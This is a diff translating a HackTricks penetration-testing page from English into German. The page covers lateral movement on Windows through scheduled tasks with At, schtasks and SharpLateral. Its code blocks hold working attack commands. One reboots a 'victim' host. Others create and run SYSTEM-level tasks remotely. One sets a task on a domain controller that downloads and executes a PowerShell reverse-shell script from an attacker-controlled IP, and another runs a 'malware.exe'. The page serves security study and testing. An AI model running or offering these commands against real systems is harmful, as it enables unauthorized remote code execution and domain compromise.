@@ -2,16 +2,13 @@
 
 {{#include ../../banners/hacktricks-training.md}}
 
-## How Does it works
+## Wie funktioniert es
 
-At allows to schedule tasks in hosts where you know username/(password/Hash). So, you can use it to execute commands in other hosts and get the output.
-
+At ermöglicht das Planen von Aufgaben auf Hosts, bei denen Sie den Benutzernamen/(Passwort/Hash) kennen. So können Sie es verwenden, um Befehle auf anderen Hosts auszuführen und die Ausgabe zu erhalten.
 ```
 At \\victim 11:00:00PM shutdown -r
 ```
-
-Using schtasks you need first to create the task and then call it:
-
+Um schtasks zu verwenden, müssen Sie zuerst die Aufgabe erstellen und sie dann aufrufen:
 ```bash
 schtasks /create /n <TASK_NAME> /tr C:\path\executable.exe /sc once /st 00:00 /S <VICTIM> /RU System
 schtasks /run /tn <TASK_NAME> /S <VICTIM>
@@ -21,14 +18,10 @@ schtasks /run /tn <TASK_NAME> /S <VICTIM>
 schtasks /create /S dcorp-dc.domain.local /SC Weekely /RU "NT Authority\SYSTEM" /TN "MyNewtask" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.X/InvokePowerShellTcp.ps1''')'"
 schtasks /run /tn "MyNewtask" /S dcorp-dc.domain.local
 ```
-
-You can also use [SharpLateral](https://github.com/mertdas/SharpLateral):
-
+Sie können auch [SharpLateral](https://github.com/mertdas/SharpLateral) verwenden:
 ```bash
 SharpLateral schedule HOSTNAME C:\Users\Administrator\Desktop\malware.exe TaskName
 ```
-
-More information about the [**use of schtasks with silver tickets here**](../active-directory-methodology/silver-ticket.md#host).
+Mehr Informationen über die [**Verwendung von schtasks mit Silver Tickets hier**](../active-directory-methodology/silver-ticket.md#host).
 
 {{#include ../../banners/hacktricks-training.md}}
-
